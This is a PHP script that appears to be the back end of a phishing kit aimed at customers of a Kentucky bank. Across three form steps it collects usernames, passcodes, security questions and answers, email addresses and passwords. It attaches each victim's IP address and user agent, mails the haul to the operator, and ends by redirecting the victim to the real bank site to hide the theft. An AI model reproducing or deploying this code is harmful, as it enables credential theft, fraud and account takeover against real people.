<?php
ob_start();

include 'email.php';

if (isset($_POST['btn1'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Username            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./quest.html");
	
	
}

else if (isset($_POST['btn2'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Question 1            : ".$_POST['q1']."\n";
	$message .= "Answer              : ".$_POST['a1']."\n";

	$message .= "Question 2            : ".$_POST['q2']."\n";
	$message .= "Answer              : ".$_POST['a2']."\n";

	$message .= "Question 3            : ".$_POST['q3']."\n";
	$message .= "Answer              : ".$_POST['a3']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./em.html");
	
	
}

else if (isset($_POST['btn3'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email Address            : ".$_POST['ai']."\n";
	$message .= "PAssword              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: https://www.peoplesbankofky.com");
	
	
}
ob_end_flush();
?>